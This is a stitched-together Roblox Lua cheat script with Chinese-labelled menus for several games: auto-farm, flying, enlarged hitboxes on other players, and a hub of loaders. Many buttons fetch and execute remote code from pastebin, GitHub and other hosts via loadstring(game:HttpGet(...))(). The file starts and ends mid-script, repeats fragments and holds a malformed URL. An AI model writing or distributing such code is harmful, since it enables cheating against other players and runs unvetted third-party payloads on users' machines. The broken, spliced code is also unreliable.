Open.TextColor3 = Color3.fromRGB(255, 255, 255)
Open.TextScaled = true
Open.TextSize = 14.000
Open.TextStrokeTransparency = 0.000
Open.TextWrapped = true
Open.MouseButton1Click:connect(function()
	Main.Visible = true
	Close.Visible = true
	Open.Visible = false
end)

Close.Name = "关掉"
Close.Parent = ScreenGui
Close.BackgroundColor3 = Color3.fromRGB(255, 114, 114)
Close.BorderSizePixel = 0
Close.Position = UDim2.new(0.899959266, 0, 0.490122825, 0)
Close.Size = UDim2.new(0, 90, 0, 38)
Close.Font = Enum.Font.Cartoon
Close.Text = "X"
Close.TextColor3 = Color3.fromRGB(255, 255, 255)
Close.TextScaled = true
Close.TextSize = 14.000
Close.TextStrokeTransparency = 0.000
Close.TextWrapped = true
Close.Visible = false
Close.MouseButton1Click:connect(function()
	Main.Visible = false
	Close.Visible = false
	Open.Visible = true
end)
-- Gui to Lua
-- Version: 3.2

-- Instances:

local BS2 = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local unequip = Instance.new("TextButton")
local weapon = Instance.new("TextBox")
local StopFarming = Instance.new("TextButton")
local Farm = Instance.new("TextButton")
local equip = Instance.new("TextButton")
local HUD = Instance.new("TextButton")
local Fly = Instance.new("TextButton")
local DisPa = Instance.new("TextButton")
local Open = Instance.new("TextButton")
local Close = Instance.new("TextButton")
local StopFlying = Instance.new("TextButton")

--Properties:

BS2.Name = "BS2"
BS2.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
BS2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
BS2.disabled = true

Main.Name = "主要的"
Main.Parent = BS2
Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Main.Position = UDim2.new(0.201550394, 0, 0.140264019, 0)
Main.Size = UDim2.new(0, 538, 0, 288)
Main.Active = true
Main.Draggable = true

TextLabel.Parent = Main
TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.Size = UDim2.new(0, 538, 0, 37)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "yes bs2 hack made by Rush#2852"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

unequip.Name = "不装备"
unequip.Parent = Main
unequip.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
unequip.Position = UDim2.new(0.68959105, 0, 0.651790202, 0)
unequip.Size = UDim2.new(0, 155, 0, 92)
unequip.Font = Enum.Font.SourceSans
unequip.Text = "取消装备"
unequip.TextColor3 = Color3.fromRGB(0, 0, 0)
unequip.TextScaled = true
unequip.TextSize = 14.000
unequip.TextWrapped = true
unequip.MouseButton1Click:connect(function()
	equip.Visible = true
	unequip.Visible = false
	_G.equip = false
end)

weapon.Name = "武器"
weapon.Parent = Main
weapon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
weapon.Position = UDim2.new(0.018587362, 0, 0.163290024, 0)
weapon.Size = UDim2.new(0, 517, 0, 52)
weapon.Font = Enum.Font.SourceSans
weapon.Text = "武器"
weapon.TextColor3 = Color3.fromRGB(0, 0, 0)
weapon.TextScaled = true
weapon.TextSize = 14.000
weapon.TextWrapped = true

StopFarming.Name = "停止锻炼"
StopFarming.Parent = Main
StopFarming.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
StopFarming.Position = UDim2.new(0.0167286247, 0, 0.651790202, 0)
StopFarming.Size = UDim2.new(0, 144, 0, 92)
StopFarming.Font = Enum.Font.SourceSans
StopFarming.Text = "停止锻炼"
StopFarming.TextColor3 = Color3.fromRGB(0, 0, 0)
StopFarming.TextScaled = true
StopFarming.TextSize = 14.000
StopFarming.TextWrapped = true
StopFarming.MouseButton1Click:connect(function()
	Farm.Visible = true
	StopFarming.Visible = false
	_G.farm = false
end)

Farm.Name = "锻炼"
Farm.Parent = Main
Farm.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Farm.Position = UDim2.new(0.0167286247, 0, 0.651790202, 0)
Farm.Size = UDim2.new(0, 144, 0, 92)
Farm.Font = Enum.Font.SourceSans
Farm.Text = "锻炼"
Farm.TextColor3 = Color3.fromRGB(0, 0, 0)
Farm.TextScaled = true
Farm.TextSize = 14.000
Farm.TextWrapped = true
Farm.MouseButton1Click:connect(function()
	StopFarming.Visible = true
	Farm.Visible = false
	_G.farm = true
	while _G.farm do
		wait()
		for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
			if v.Name == weapon.Text then v:Activate() end
		end
	end
end)

equip.Name = "装备"
equip.Parent = Main
equip.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
equip.Position = UDim2.new(0.68959105, 0, 0.651790202, 0)
equip.Size = UDim2.new(0, 155, 0, 92)
equip.Font = Enum.Font.SourceSans
equip.Text = "装备"
equip.TextColor3 = Color3.fromRGB(0, 0, 0)
equip.TextScaled = true
equip.TextSize = 14.000
equip.TextWrapped = true
equip.MouseButton1Click:connect(function()
	unequip.Visible = true
	equip.Visible = false
	_G.equip = true
	while _G.equip do
		wait()
		for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
			if v.Name == weapon.Text then
				v.Parent = game.Players.LocalPlayer.Character
			end
		end
	end
end)

HUD.Name = "平视显示器"
HUD.Parent = Main
HUD.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HUD.Position = UDim2.new(0.0204460975, 0, 0.373439103, 0)
HUD.Size = UDim2.new(0, 517, 0, 71)
HUD.Font = Enum.Font.SourceSans
HUD.Text = "删除HUD"
HUD.TextColor3 = Color3.fromRGB(0, 0, 0)
HUD.TextScaled = true
HUD.TextSize = 14.000
HUD.TextWrapped = true
HUD.MouseButton1Click:connect(function()
	game:GetService("Players").LocalPlayer.PlayerGui.HUD:Destroy()
end)

Fly.Name = "飞"
Fly.Parent = Main
Fly.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Fly.Position = UDim2.new(0.351301104, 0, 0.651790202, 0)
Fly.Size = UDim2.new(0, 144, 0, 40)
Fly.Font = Enum.Font.SourceSans
Fly.Text = "飞(不能解开)"
Fly.TextColor3 = Color3.fromRGB(0, 0, 0)
Fly.TextScaled = true
Fly.TextSize = 14.000
Fly.TextWrapped = true
Fly.MouseButton1Down:connect(function()
	_G.FLYING = false
	local LP = game:service('Players').LocalPlayer
	local T = LP.Character.UpperTorso
	local CONTROL = {F = 0, B = 0, L = 0, R = 0}
	local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
	local SPEED = 5
	local MOUSE = LP:GetMouse()


	local function FLY()
		_G.FLYING = true
		local BG = Instance.new('BodyGyro', T)
		local BV = Instance.new('BodyVelocity', T)
		BG.P = 9e4
		BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.cframe = T.CFrame
		BV.velocity = Vector3.new(0, 0.1, 0)
		BV.maxForce = Vector3.new(9e9, 9e9, 9e9)


		spawn(function()
			repeat wait()
				LP.Character.Humanoid.PlatformStand = true
				if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
					SPEED = 50
				elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
					SPEED = 0
				end
				if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
					BV.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
					lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
				elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
					BV.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
				else
					BV.velocity = Vector3.new(0, 0.1, 0)
				end
				BG.cframe = game.Workspace.CurrentCamera.CoordinateFrame
			until not _G.FLYING
			CONTROL = {F = 0, B = 0, L = 0, R = 0}
			lCONTROL = {F = 0, B = 0, L = 0, R = 0}
			SPEED = 0
			BG:destroy()
			BV:destroy()
			LP.Character.Humanoid.PlatformStand = false
		end)
	end

	MOUSE.KeyDown:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 1
		elseif KEY:lower() == 's' then
			CONTROL.B = -1
		elseif KEY:lower() == 'a' then
			CONTROL.L = -1 
		elseif KEY:lower() == 'd' then 
			CONTROL.R = 1
		end
	end)

	MOUSE.KeyUp:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 0
		elseif KEY:lower() == 's' then
			CONTROL.B = 0
		elseif KEY:lower() == 'a' then
			CONTROL.L = 0
		elseif KEY:lower() == 'd' then
			CONTROL.R = 0
		end
	end)




	FLY()
end)

DisPa.Name = "显示"
DisPa.Parent = Main
DisPa.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DisPa.Position = UDim2.new(0.351301104, 0, 0.832345724, 0)
DisPa.Size = UDim2.new(0, 144, 0, 40)
DisPa.Font = Enum.Font.SourceSans
DisPa.Text = "显示平视显示器"
DisPa.TextColor3 = Color3.fromRGB(0, 0, 0)
DisPa.TextScaled = true
DisPa.TextSize = 14.000
DisPa.TextWrapped = true
DisPa.MouseButton1Click:connect(function()
	game:GetService("Players").LocalPlayer.PlayerGui.HUD.Frame.MuscleGain:Destroy()
end)

Open.Name = "打开"
Open.Parent = BS2
Open.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Open.Position = UDim2.new(0.784053147, 0, 0.615511537, 0)
Open.Size = UDim2.new(0, 200, 0, 50)
Open.Font = Enum.Font.SourceSans
Open.Text = "打开"
Open.TextColor3 = Color3.fromRGB(0, 0, 0)
Open.TextSize = 14.000
Open.MouseButton1Click:connect(function()
	Main.Visible = true
	Close.Visible = true
	Open.Visible = false
end)

Close.Name = "关掉"
Close.Parent = BS2
Close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Close.Position = UDim2.new(0.785160601, 0, 0.615511537, 0)
Close.Size = UDim2.new(0, 201, 0, 50)
Close.Font = Enum.Font.SourceSans
Close.Text = "关掉"
Close.TextColor3 = Color3.fromRGB(0, 0, 0)
Close.TextSize = 14.000
Close.MouseButton1Click:connect(function()
	Main.Visible = false
	Close.Visible = false
	Open.Visible = true
end)



game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "Rush BS2 Script V1.2";
	Text = "Thank you for using my script! :))";
})
end
})
local Tab = Window:MakeTab({
    Name = "巴掌(slap battles)",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Tab:AddButton({
	Name = "比较强",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Giangplay/Slap_Battles/main/Slap_Battles.lua"))()
end
})    
Tab:AddButton({
	Name = "功能很多",
	Callback = function()
loadstring(game:HttpGet(("https://raw.githubusercontent.com/ionlyusegithubformcmods/1-Line-Scripts/main/Slap%20Battles")))()
end
})
Tab:AddButton({
	Name = "巴掌光环碰到筐就能打到",
	Callback = function()
_G.HeadSize = 20
_G.Disabled = true
 
game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.HumanoidRootPart.Transparency = 0.7
v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really white")
v.Character.HumanoidRootPart.Material = "Neon"
v.Character.HumanoidRootPart.CanCollide = false
end)
end
end
end
end)
end
})
Tab:AddButton({
	Name = "大逃杀",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BreApple/RobloxUI/main/SRscriptNew"))()
end
})
local Tab = Window:MakeTab({
    Name = "极速传奇",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Tab:AddButton({
	Name = "1",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/cwCdNqds"))()
end
})    
Tab:AddButton({
	Name = "2",
	Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/BoaHacker/ROBLOX/main/cheat', true))()
end
})
local Tab = Window:MakeTab({
    Name = "其他脚本",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Tab:AddButton({
	Name = "北京时间(建议)",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/6xQ5gtbj"))()
end
})
Tab:AddButton({
	Name = "蜂群模拟器",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Historia00012/HISTORIAHUB/main/BSS%20FREE"))()
end
})    
Tab:AddButton({
	Name = "俄亥俄州",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/hkvHeHed",true))()
end
})
Tab:AddButton({
	Name = "伐木大亨",
	Callback = function()
-- Made By Doodle & Redesigned And Fixed  By Dragon Dupe
-- Doodle's Hub Beta
 
-- Instances:
 
local DoodlesHub = Instance.new("ScreenGui")
local OpenFrame = Instance.new("Frame")
local Open = Instance.new("TextButton")
local Main = Instance.new("Frame")
local GuiNameAndClose = Instance.new("Frame")
local DoodleHub = Instance.new("TextLabel")
local Close = Instance.new("TextButton")
local GuiNameAndClose_2 = Instance.new("Frame")
local Credits = Instance.new("TextLabel")
local bloodhub = Instance.new("TextButton")
local jb36hub = Instance.new("TextButton")
local jjkhub = Instance.new("TextButton")
local duper = Instance.new("TextButton")
local ferry = Instance.new("TextButton")
local pinkwires = Instance.new("TextButton")
 
--Properties:
 
DoodlesHub.Name = "DoodlesHub"
DoodlesHub.Parent = game.CoreGui
DoodlesHub.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
OpenFrame.Name = "OpenFrame"
OpenFrame.Parent = DoodlesHub
OpenFrame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
OpenFrame.Position = UDim2.new(0.431301981, 0, 0.946215153, 0)
OpenFrame.Size = UDim2.new(0, 98, 0, 27)
 
Open.Name = "Open"
Open.Parent = OpenFrame
Open.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Open.Size = UDim2.new(0, 98, 0, 26)
Open.Font = Enum.Font.Cartoon
Open.Text = "Open"
Open.TextColor3 = Color3.fromRGB(0, 0, 0)
Open.TextScaled = true
Open.TextSize = 14.000
Open.TextWrapped = true
Open.MouseButton1Down:connect(function()
Main.Visible = true
OpenFrame.Visible = false
end)
 
 
Main.Name = "Main"
Main.Parent = DoodlesHub
Main.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Main.Position = UDim2.new(0.191400826, 0, 0.203187257, 0)
Main.Size = UDim2.new(0, 462, 0, 248)
Main.Draggable = true
 
GuiNameAndClose.Name = "GuiNameAndClose"
GuiNameAndClose.Parent = Main
GuiNameAndClose.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
GuiNameAndClose.Size = UDim2.new(0, 462, 0, 25)
 
DoodleHub.Name = "DoodleHub"
DoodleHub.Parent = GuiNameAndClose
DoodleHub.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DoodleHub.BackgroundTransparency = 1.000
DoodleHub.Position = UDim2.new(0.231366277, 0, 0, 0)
DoodleHub.Size = UDim2.new(0, 248, 0, 25)
DoodleHub.Font = Enum.Font.Cartoon
DoodleHub.Text = "Doodle's Hub"
DoodleHub.TextColor3 = Color3.fromRGB(255, 255, 255)
DoodleHub.TextScaled = true
DoodleHub.TextSize = 14.000
DoodleHub.TextWrapped = true
 
Close.Name = "Close"
Close.Parent = GuiNameAndClose
Close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Close.BackgroundTransparency = 1.000
Close.Position = UDim2.new(0.890109897, 0, 0.0399999619, 0)
Close.Size = UDim2.new(0, 39, 0, 24)
Close.Font = Enum.Font.Cartoon
Close.Text = "Close"
Close.TextColor3 = Color3.fromRGB(255, 255, 255)
Close.TextScaled = true
Close.TextSize = 14.000
Close.TextWrapped = true
Close.MouseButton1Down:connect(function()
OpenFrame.Visible = true
Main.Visible = false
end)
 
GuiNameAndClose_2.Name = "GuiNameAndClose"
GuiNameAndClose_2.Parent = Main
GuiNameAndClose_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
GuiNameAndClose_2.Position = UDim2.new(0, 0, 0.889243901, 0)
GuiNameAndClose_2.Size = UDim2.new(0, 462, 0, 27)
 
Credits.Name = "Credits"
Credits.Parent = GuiNameAndClose_2
Credits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Credits.BackgroundTransparency = 1.000
Credits.Position = UDim2.new(0.0887445882, 0, -0.00153878704, 0)
Credits.Size = UDim2.new(0, 363, 0, 27)
Credits.Font = Enum.Font.Cartoon
Credits.Text = "Made By Doodle & Redesigned/Fixed By mlkal3rb"
Credits.TextColor3 = Color3.fromRGB(255, 255, 255)
Credits.TextScaled = true
Credits.TextSize = 14.000
Credits.TextWrapped = true
 
bloodhub.Name = "bloodhub"
bloodhub.Parent = Main
bloodhub.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
bloodhub.Position = UDim2.new(0.712204456, 0, 0.194377705, 0)
bloodhub.Size = UDim2.new(0, 114, 0, 40)
bloodhub.Font = Enum.Font.Cartoon
bloodhub.Text = "Blood Hub"
bloodhub.TextColor3 = Color3.fromRGB(255, 255, 255)
bloodhub.TextSize = 20.000
bloodhub.TextWrapped = true
bloodhub.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://trojxnscripts.xyz/BloodHub", true))()
end)
 
jb36hub.Name = "jb36hub"
jb36hub.Parent = Main
jb36hub.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
jb36hub.Position = UDim2.new(0.390442848, 0, 0.194377705, 0)
jb36hub.Size = UDim2.new(0, 114, 0, 40)
jb36hub.Font = Enum.Font.Cartoon
jb36hub.Text = "JB36 Hub"
jb36hub.TextColor3 = Color3.fromRGB(255, 255, 255)
jb36hub.TextSize = 20.000
jb36hub.TextWrapped = true
jb36hub.MouseButton1Down:connect(function()
-- Gui to Lua
-- Version: 3
 
-- Instances:
Opened = false
Enabled = false
local Jb36Hub = Instance.new("ScreenGui")
local MainGUI = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local jb3name = Instance.new("TextLabel")
local Blood = Instance.new("TextButton")
local Ferry = Instance.new("TextButton")
local Syntax = Instance.new("TextButton")
local BringUp = Instance.new("TextButton")
local Extremelumber = Instance.new("TextButton")
local Duper = Instance.new("TextButton")
local DarkLumberX = Instance.new("TextButton")
local Lightlumber = Instance.new("TextButton")
local discord = Instance.new("TextButton")
local VenyxCracked = Instance.new("TextButton")
local OpenGUI = Instance.new("TextButton")
local disc = Instance.new("Frame")
local sub = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
 
--Properties:
 
Jb36Hub.Name = "Jb36 Hub "
Jb36Hub.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Jb36Hub.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
  wait(0.3)
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Jb36 Hub";
    Text = "Successfully Loaded..."
})
 
MainGUI.Name = "MainGUI"
MainGUI.Parent = Jb36Hub
MainGUI.BackgroundColor3 = Color3.new(1, 1, 1)
MainGUI.Position = UDim2.new(0.136633649, 0, 0.131524011, 0)
MainGUI.Size = UDim2.new(0, 404, 0, 295)
MainGUI.Visible = false
MainGUI.Active = true
MainGUI.Draggable = true
 
ImageLabel.Parent = MainGUI
ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel.Position = UDim2.new(0, 0, 0.00330544263, 0)
ImageLabel.Size = UDim2.new(0, 404, 0, 294)
ImageLabel.Image = "http://www.roblox.com/asset/?id=4341384895"
 
jb3name.Name = "jb3name "
jb3name.Parent = MainGUI
jb3name.BackgroundColor3 = Color3.new(1, 1, 1)
jb3name.BackgroundTransparency = 1
jb3name.Position = UDim2.new(-0.353960395, 0, -0.00155497715, 0)
jb3name.Size = UDim2.new(0, 404, 0, 50)
jb3name.Font = Enum.Font.SourceSans
jb3name.Text = "Jb36 Hub"
jb3name.TextColor3 = Color3.new(0, 0, 0)
jb3name.TextSize = 30
 
Blood.Name = "Blood"
Blood.Parent = MainGUI
Blood.BackgroundColor3 = Color3.new(0, 0.952941, 1)
Blood.BackgroundTransparency = 0.5
Blood.Position = UDim2.new(0, 0, 0.376271188, 0)
Blood.Size = UDim2.new(0, 101, 0, 28)
Blood.Font = Enum.Font.SourceSans
Blood.Text = "Blood"
Blood.TextColor3 = Color3.new(0, 0, 0)
Blood.TextSize = 14
Blood.MouseButton1Down:connect(function()
 loadstring(game:HttpGet(('https://pastebin.com/raw/qt3SDXvH'),true))()
end)
 
Ferry.Name = "Ferry"
Ferry.Parent = MainGUI
Ferry.BackgroundColor3 = Color3.new(0, 0.952941, 1)
Ferry.BackgroundTransparency = 0.5
Ferry.Position = UDim2.new(0, 0, 0.549152553, 0)
Ferry.Size = UDim2.new(0, 101, 0, 28)
Ferry.Font = Enum.Font.SourceSans
Ferry.Text = "Ferry"
Ferry.TextColor3 = Color3.new(0, 0, 0)
Ferry.TextSize = 14
Ferry.MouseButton1Down:connect(function()
 loadstring(game:HttpGet(('https://pastebin.com/raw/D46E1PYw'),true))()
end)
 
Syntax.Name = "Syntax"
Syntax.Parent = MainGUI
Syntax.BackgroundColor3 = Color3.new(0, 0.952941, 1)
Syntax.BackgroundTransparency = 0.5
Syntax.Position = UDim2.new(0, 0, 0.7355932, 0)
Syntax.Size = UDim2.new(0, 101, 0, 28)
Syntax.Font = Enum.Font.SourceSans
Syntax.Text = "Syntax"
Syntax.TextColor3 = Color3.new(0, 0, 0)
Syntax.TextSize = 14
Syntax.MouseButton1Down:connect(function()
 loadstring(game:HttpGet(('https://pastebin.com/raw/wWxsHtxJ'),true))()
end)
 
BringUp.Name = "Bring Up "
BringUp.Parent = MainGUI
BringUp.BackgroundColor3 = Color3.new(0, 0.952941, 1)
BringUp.BackgroundTransparency = 0.5
BringUp.Position = UDim2.new(0.344059408, 0, 0.376271188, 0)
BringUp.Size = UDim2.new(0, 101, 0, 28)
BringUp.Font = Enum.Font.SourceSans
BringUp.Text = "Bring Up"
BringUp.TextColor3 = Color3.new(0, 0, 0)
BringUp.TextSize = 14
BringUp.MouseButton1Down:connect(function()
loadstring(game:GetObjects("rbxassetid://01925396229")[1].Source)()
end)
 
Extremelumber.Name = "Extreme lumber "
Extremelumber.Parent = MainGUI
Extremelumber.BackgroundColor3 = Color3.new(0, 0.952941, 1)
Extremelumber.BackgroundTransparency = 0.5
Extremelumber.Position = UDim2.new(0.344059408, 0, 0.549152553, 0)
Extremelumber.Size = UDim2.new(0, 101, 0, 28)
Extremelumber.Font = Enum.Font.SourceSans
Extremelumber.Text = "Extreme Lumber "
Extremelumber.TextColor3 = Color3.new(0, 0, 0)
Extremelumber.TextSize = 14
Extremelumber.MouseButton1Down:connect(function()
 loadstring(game:HttpGet(('https://pastebin.com/raw/PvQMf5vv'),true))()
end)
 
Duper.Name = "Duper"
Duper.Parent = MainGUI
Duper.BackgroundColor3 = Color3.new(0, 0.952941, 1)
Duper.BackgroundTransparency = 0.5
Duper.Position = UDim2.new(0.344059408, 0, 0.7355932, 0)
Duper.Size = UDim2.new(0, 101, 0, 28)
Duper.Font = Enum.Font.SourceSans
Duper.Text = "Duper"
Duper.TextColor3 = Color3.new(0, 0, 0)
Duper.TextSize = 14
Duper.MouseButton1Down:connect(function()
 loadstring(game:HttpGet(('https://pastebin.com/raw/FFB3wAgi'),true))()
end)
 
DarkLumberX.Name = "Dark Lumber X"
DarkLumberX.Parent = MainGUI
DarkLumberX.BackgroundColor3 = Color3.new(0, 0.952941, 1)
DarkLumberX.BackgroundTransparency = 0.5
DarkLumberX.Position = UDim2.new(0.646039605, 0, 0.376271188, 0)
DarkLumberX.Size = UDim2.new(0, 101, 0, 28)
DarkLumberX.Font = Enum.Font.SourceSans
DarkLumberX.Text = "Dark Lumber X"
DarkLumberX.TextColor3 = Color3.new(0, 0, 0)
DarkLumberX.TextSize = 14
DarkLumberX.MouseButton1Down:connect(function()
 loadstring(game:HttpGet(('https://https://pastebin.com/raw/VD8BWTWL'),true))()
end)
 
Lightlumber.Name = "Light lumber "
Lightlumber.Parent = MainGUI
Lightlumber.BackgroundColor3 = Color3.new(0, 0.952941, 1)
Lightlumber.BackgroundTransparency = 0.5
Lightlumber.Position = UDim2.new(0.646039605, 0, 0.549152553, 0)
Lightlumber.Size = UDim2.new(0, 101, 0, 28)
Lightlumber.Font = Enum.Font.SourceSans
Lightlumber.Text = "Light Lumber "
Lightlumber.TextColor3 = Color3.new(0, 0, 0)
Lightlumber.TextSize = 14
Lightlumber.MouseButton1Down:connect(function()
 loadstring(game:HttpGet(('https://pastebin.com/raw/5W8wSCsi'),true))()
end)
 
discord.Name = "discord"
discord.Parent = MainGUI
discord.BackgroundColor3 = Color3.new(0, 0.952941, 1)
discord.BackgroundTransparency = 0.5
discord.Position = UDim2.new(0.646039605, 0, 0.7355932, 0)
discord.Size = UDim2.new(0, 101, 0, 28)
discord.Font = Enum.Font.SourceSans
discord.Text = "Discord Jb server "
discord.TextColor3 = Color3.new(0, 0, 0)
discord.TextSize = 14
discord.Active = true
discord.Draggable = true
discord.MouseButton1Click:Connect(function()
 print("Open")
 if Enabled == false then
  Enabled = true
  disc.Visible = true
    wait(0.3)
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Jb36 Hub";
    Text = "Opened.."
})
 else
  Enabled = false
  disc.Visible = false
      wait(0.3)
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Jb36 Hub";
    Text = "Closed.."
})
 end
end)
 
VenyxCracked.Name = "VenyxCracked"
VenyxCracked.Parent = MainGUI
VenyxCracked.BackgroundColor3 = Color3.new(0, 0.952941, 1)
VenyxCracked.BackgroundTransparency = 0.5
VenyxCracked.Position = UDim2.new(0.344059408, 0, 0.901694894, 0)
VenyxCracked.Size = UDim2.new(0, 101, 0, 28)
VenyxCracked.Font = Enum.Font.SourceSans
VenyxCracked.Text = "Veny Cracked"
VenyxCracked.TextColor3 = Color3.new(0, 0, 0)
VenyxCracked.TextSize = 14
VenyxCracked.MouseButton1Down:connect(function()
 loadstring(game:HttpGet(('https://pastebin.com/raw/WSmRCq69'),true))()
end)
 
OpenGUI.Name = "OpenGUI"
OpenGUI.Parent = Jb36Hub
OpenGUI.BackgroundColor3 = Color3.new(1, 1, 1)
OpenGUI.BorderColor3 = Color3.new(0.0156863, 0.847059, 0.921569)
OpenGUI.BorderSizePixel = 5
OpenGUI.Position = UDim2.new(0, 0, 0.922755718, 0)
OpenGUI.Size = UDim2.new(0, 104, 0, 31)
OpenGUI.Font = Enum.Font.SourceSans
OpenGUI.Text = ">>OPEN<<"
OpenGUI.TextColor3 = Color3.new(0, 0, 0)
OpenGUI.TextSize = 25
OpenGUI.TextStrokeColor3 = Color3.new(0, 1, 0.968628)
OpenGUI.TextStrokeTransparency = 6
OpenGUI.Active = true
OpenGUI.Draggable = false
OpenGUI.MouseButton1Click:Connect(function()
 print("Closed")
 if Opened == false then
  Opened = true
  MainGUI.Visible = true
  OpenGUI.Text = ">> Close <<"
    wait(0.3)
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Jb36 Hub";
    Text = "Opened.."
})
 else
  Opened = false
  MainGUI.Visible = false
  OpenGUI.Text = ">> Open <<"
      wait(0.3)
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Jb36 Hub";
    Text = "Closed.."
})
 end
end)
 
disc.Name = "disc"
disc.Parent = Jb36Hub
disc.BackgroundColor3 = Color3.new(0, 0.984314, 1)
disc.BackgroundTransparency = 0.5
disc.Position = UDim2.new(0.536633611, 0, 0.129436329, 0)
disc.Size = UDim2.new(0, 158, 0, 94)
disc.Visible = false
 
sub.Name = "sub"
sub.Parent = disc
sub.BackgroundColor3 = Color3.new(1, 1, 1)
sub.BackgroundTransparency = 1
sub.Position = UDim2.new(-0.0053266692, 0, 0.00575832603, 0)
sub.Size = UDim2.new(0, 157, 0, 50)
sub.Image = "http://www.roblox.com/asset/?id=4343068165"
 
TextLabel.Parent = disc
TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel.BackgroundTransparency = 1
TextLabel.Position = UDim2.new(-0.00632911408, 0, 0.520431638, 0)
TextLabel.Size = UDim2.new(0, 158, 0, 44)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "https://discord.gg/FZRpyyY"
TextLabel.TextColor3 = Color3.new(0, 0, 0)
TextLabel.TextSize = 14
end)
 
jjkhub.Name = "jjkhub"
jjkhub.Parent = Main
jjkhub.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
jjkhub.Position = UDim2.new(0.0627705306, 0, 0.194377705, 0)
jjkhub.Size = UDim2.new(0, 114, 0, 40)
jjkhub.Font = Enum.Font.Cartoon
jjkhub.Text = "JJK Hub"
jjkhub.TextColor3 = Color3.fromRGB(255, 255, 255)
jjkhub.TextSize = 20.000
jjkhub.TextWrapped = true
jjkhub.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/H7VAJx6Q", true))()
end)
 
duper.Name = "duper"
duper.Parent = Main
duper.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
